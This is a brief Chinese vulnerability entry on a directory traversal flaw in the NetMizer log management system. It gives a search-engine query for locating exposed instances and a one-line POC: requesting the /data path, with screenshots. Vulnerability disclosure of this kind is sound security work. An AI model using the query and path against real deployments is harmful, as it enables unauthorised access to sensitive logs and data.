# NetMizer 日志管理系统 data 目录遍历漏洞

## 漏洞描述

北京灵州网络技术有限公司NetMizer日志管理系统存在目录遍历漏洞，由于 /data 控制不严格，攻击者可利用该漏洞获取敏感信息。

## 漏洞影响

<a-checkbox checked>NetMizer 日志管理系统</a-checkbox></br>

## 网络测绘

<a-checkbox checked>title="NetMizer 日志管理系统"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1628834857867-6694d560-2345-49e8-9460-2296c316a7a3.png)

验证POC

```python
/data
```

![img](../../../.vuepress/public/img/1645850009759-0b0d5ec6-de57-49c4-a4f5-d3398017f816.png)